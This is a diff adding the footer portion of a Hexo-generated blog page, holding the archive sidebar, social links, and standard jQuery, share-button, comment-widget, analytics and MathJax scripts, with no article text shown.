+    <p class="asidetitle"><a href="/archives">Archives</a></p>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a><span class="archive-list-count">3</span></li></ul>
+  </div>
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/daikersec" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		<a href="https://github.com/daikersec" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		<a href="https://twitter.com/daikersec" target="_blank" class="icon-twitter" title="twitter"></a>
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:daikersec@gmail.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2018 
+		
+		<a href="/about" target="_blank" title="daiker">daiker</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"嘟嘟MD"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?2a1c7e2856fa901812e41edbfcef616e";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
